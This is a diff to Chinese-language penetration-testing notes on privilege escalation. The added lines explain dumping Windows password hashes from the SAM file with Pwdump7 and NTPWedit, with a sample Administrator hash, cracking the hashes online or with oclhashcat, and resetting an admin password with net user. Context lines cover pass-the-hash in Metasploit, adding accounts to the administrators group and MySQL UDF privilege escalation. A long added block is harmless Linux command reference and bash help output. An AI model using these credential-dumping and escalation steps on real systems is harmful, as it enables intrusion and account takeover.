@@ -19,10 +19,35 @@
 			a.eternalblue
 		}
 	}
+	
 	2.getpass提权
 	{
 		一款获取计算机用户账号密码的工具，运行getpass.exe即可获取用户密码
+		
+		C:\Windows\System32\config\sam.sam文件中存放管理员密码
+			NTPWedit查看编辑sam文件密码
+			
+		Pwdump7可以在CMD下提取出系统中的用户的密码hash (包括LM和NTLM),当然必须要有系统权限.提取出了HASH,再用ophcrack破出明文密码
+			
+			
+			当我们为Administrator帐户设置一个密码后，再次运行“PwDump7”命令时，就会得到如下内容：
+				Administrator:500:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
+			这个获得的密码是一个密文，我们还需要对其进行反译才能获得相应的明文密码。先来看一下“PwDump7”命令的其他用法：
+					pwdump7.exe                               (Dump system passwords)
+					pwdump7.exe -s <samfile> <systemfile>     (Dump passwords from files)
+					pwdump7.exe -d <filename> [destionation] (Copy filename to destionation)
+					pwdump7.exe -h                           (Show this help)
+				这里的“-s”参数，是指从SAM数据库文件中提取hash，这个文件位于“%systemroot%configsam”目录中。
+				这里的“-d”参数，是指把一个文件复制到另一个位置，如命令可以是：
+					D:>PwDump7.exe –d c:abc.sys abc.chm
+					这个转移参数的最大魅力，是可以把进程正在调用的文件复制成功，如复制“pagefile.sys ”文件。
+				解决提示libeay32.dll找不到或缺少的问题:
+					拷贝libeay32.dll到windows/system32下即可
+		hash破解网址
+				http://www.objectif-securite.ch
+		使用oclhashcat暴力破解	
 	}
+	
 	3.hash传递入侵提权
 	{
 		在msf中执行：
@@ -68,6 +93,7 @@
 		Net user name pass /add //添加用户
 		Net localgroup administrators name /add //添加至管理员用户组
 		Net user name /del 删除用户名为name的用户 //删除
+		Net user name pass  //管理员权限下可直接修改管理员密码
 		pwd
 		
 		提权常用命令
@@ -110,8 +136,7 @@
 			at \\10.0.0.59
 		}
 
-hash破解网址
-	http://www.objectif-securite.ch
+
 	}
 }
 
@@ -348,7 +373,7 @@ hash破解网址
 					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\udf.dll' //低版本5.0以下
 				5.1以上版本
 					select @@plugin_dir
-					select load_file('C:\\?\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //高版本5.0以上
+					select load_file('C:\\????\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //高版本5.0以上
 
 				NTFS ADS文件流导出dll文件到plugin文件夹
 					解决Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在
@@ -933,12 +958,122 @@ Linux提权（exp反弹shell提权）
 思路
 操作
 Linux提权常用命令
+
 id
 uname -a
 chmod -R 777 file
 gcc -o exp exp.c
 pwd
 tar
+
+https://www.cnblogs.com/crazylqy/p/5818745.html
+显示日期的指令： date
+显示日历的指令：cal
+简单好用的计算器：bc
+	bc预设仅输出整数，如果要输出小数点下位数，那么就必须要执行 scale=number ，那个number就是小数点位数
+重要的几个热键[Tab],[ctrl]-c, [ctrl]-d 
+	[Tab]按键---具有『命令补全』不『档案补齐』的功能
+	[Ctrl]-c按键---让当前的程序『停掉』
+	[Ctrl]-d按键---通常代表着：『键盘输入结束(End Of File, EOF 戒 End OfInput)』的意思；另外，他也可以用来取代exit
+man
+	退出用q，
+	man -f man
+数据同步写入磁盘： sync
+	输入sync，在内存中尚未被更新的数据，就会被写入硬盘中；所以，这个指令在系统关机或重新启劢前执行
+惯用的关机指令：shutdown
+	重启，关机： reboot, halt,poweroff	
+切换执行等级： init
+	Linux共有七种执行等级：
+	--run level 0 :关机
+	--run level 3 :纯文本模式		
+	--run level 5 :含有图形接口模式
+	--run level 6 :重新启动
+	使用init这个指令来切换各模式：
+	如果你想要关机的话，除了上述的shutdown -h now以及poweroff之外，你也可以使用如下的指令来关机：	
+		init 0
+改变文件的所属群组：chgrp
+改变文件拥有者：chown
+	他还可以顸便直接修改群组的名称
+改变文件的权限：chmod
+	权限的设定方法有两种， 分别可以使用数字或者是符号来进行权限的变更。
+	--数字类型改变档案权限：
+	--符号类型改变档案权限：
+查看版本信息等
+	uname -a
+变换目录：cd
+显示当前所在目录：pwd
+建立新目录：mkdir
+删除『空』的目录：rmdir
+档案与目录的显示：ls
+复制档案或目录：cp
+移除档案或目录：rm
+移动档案与目录，或更名：mv
+取得路径的文件名与目录名：basename，dirname
+由第一行开始显示档案内容：cat
+从最后一行开始显示：tac（可以看出 tac 是 cat 的倒着写）
+显示的时候，顺道输出行号：nl
+一页一页的显示档案内容：more
+与 more 类似，但是比 more 更好的是，他可以往前翻页：less
+只看头几行：head
+只看尾几行：tail
+以二进制的放置读取档案内容：od
+修改档案时间或新建档案：touch
+档案预设权限：umask
+配置文件档案隐藏属性：chattr
+显示档案隐藏属性：lsattr
+观察文件类型：file
+寻找【执行挡】：which
+寻找特定档案：whereis
+寻找特定档案：locate
+寻找特定档案：find
+压缩文件和读取压缩文件：gzip，zcat	
+压缩文件和读取压缩文件：bzip2，bzcat
+压缩文件和读取压缩文件：tar
+
+
+
+
+	
+	
+	
+ job_spec [&]                            history [-c] [-d offset] [n] or hist>
+ (( expression ))                        if COMMANDS; then COMMANDS; [ elif C>
+ . filename [arguments]                  jobs [-lnprs] [jobspec ...] or jobs >
+ :                                       kill [-s sigspec | -n signum | -sigs>
+ [ arg... ]                              let arg [arg ...]
+ [[ expression ]]                        local [option] name[=value] ...
+ alias [-p] [name[=value] ... ]          logout [n]
+ bg [job_spec ...]                       mapfile [-n count] [-O origin] [-s c>
+ bind [-lpsvPSVX] [-m keymap] [-f file>  popd [-n] [+N | -N]
+ break [n]                               printf [-v var] format [arguments]
+ builtin [shell-builtin [arg ...]]       pushd [-n] [+N | -N | dir]
+ caller [expr]                           pwd [-LP]
+ case WORD in [PATTERN [| PATTERN]...)>  read [-ers] [-a array] [-d delim] [->
+ cd [-L|[-P [-e]] [-@]] [dir]            readarray [-n count] [-O origin] [-s>
+ command [-pVv] command [arg ...]        readonly [-aAf] [name[=value] ...] o>
+ compgen [-abcdefgjksuv] [-o option]  >  return [n]
+ complete [-abcdefgjksuv] [-pr] [-DE] >  select NAME [in WORDS ... ;] do COMM>
+ compopt [-o|+o option] [-DE] [name ..>  set [-abefhkmnptuvxBCHP] [-o option->
+ continue [n]                            shift [n]
+ coproc [NAME] command [redirections]    shopt [-pqsu] [-o] [optname ...]
+ declare [-aAfFgilnrtux] [-p] [name[=v>  source filename [arguments]
+ dirs [-clpv] [+N] [-N]                  suspend [-f]
+ disown [-h] [-ar] [jobspec ...]         test [expr]
+ echo [-neE] [arg ...]                   time [-p] pipeline
+ enable [-a] [-dnps] [-f filename] [na>  times
+ eval [arg ...]                          trap [-lp] [[arg] signal_spec ...]
+ exec [-cl] [-a name] [command [argume>  true
+ exit [n]                                type [-afptP] name [name ...]
+ export [-fn] [name[=value] ...] or ex>  typeset [-aAfFgilrtux] [-p] name[=va>
+ false                                   ulimit [-SHabcdefilmnpqrstuvxT] [lim>
+ fc [-e ename] [-lnr] [first] [last] o>  umask [-p] [-S] [mode]
+ fg [job_spec]                           unalias [-a] name [name ...]
+ for NAME [in WORDS ... ] ; do COMMAND>  unset [-f] [-v] [-n] [name ...]
+ for (( exp1; exp2; exp3 )); do COMMAN>  until COMMANDS; do COMMANDS; done
+ function name { COMMANDS ; } or name >  variables - Names and meanings of so>
+ getopts optstring name [arg]            wait [-n] [id ...]
+ hash [-lr] [-p pathname] [-dt] [name >  while COMMANDS; do COMMANDS; done
+ help [-dms] [pattern ...]               { COMMANDS ; }
 
 
 ssh命令
